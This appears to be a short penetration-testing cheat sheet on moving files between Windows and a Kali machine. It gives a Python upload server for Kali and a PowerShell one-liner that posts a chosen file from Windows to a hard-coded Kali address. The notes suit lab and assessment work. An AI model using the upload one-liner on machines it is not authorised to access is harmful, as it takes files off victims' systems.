# File Transfers with Python





- HTTP: `python3 -m http.server [PORT]` Default port 8000








## Upload from Windows to Kali

1. On Kali:

```python
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
import cgi

UPLOAD_DIR = '[PATH TO UPLOAD DIR]'  # Change this

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Serve the upload form on GET requests
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"""
            <html><body>
            <form enctype="multipart/form-data" method="post">
                <input type="file" name="file">
                <input type="submit" value="Upload">
            </form>
            </body></html>
        """)

    def do_POST(self):
        # Handle file uploads on POST requests
        content_type, pdict = cgi.parse_header(self.headers['content-type'])
        if content_type == 'multipart/form-data':
            # Parse the form data posted
            form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
            if 'file' in form:
                file_item = form['file']
                
                # Only process files
                if file_item.filename:
                    # Define the file path
                    file_path = os.path.join(UPLOAD_DIR, os.path.basename(file_item.filename))
                    
                    # Write the file to the specified directory
                    with open(file_path, 'wb') as output_file:
                        output_file.write(file_item.file.read())
                    
                    # Send success response
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"File uploaded successfully.")
                    return
        
        # Send failure response if something goes wrong
        self.send_response(400)
        self.end_headers()
        self.wfile.write(b"File upload failed.")

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=8000):
    # Set the server address and handler
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Serving on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    # Ensure the upload directory exists
    os.makedirs(UPLOAD_DIR, exist_ok=True)
    run()


```



2. On Windows:

```powershell
 $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString(); $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }; $fileContent = Get-Content -Path "[PATH TO FILE]" -Raw; $body = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"[OUTPUT FILE NAME]`"`r`nContent-Type: application/octet-stream`r`n`r`n$fileContent`r`n--$boundary--"; Invoke-WebRequest -Uri "http://192.168.45.238:8000/" -Method Post -Headers $headers -Body $body
 ```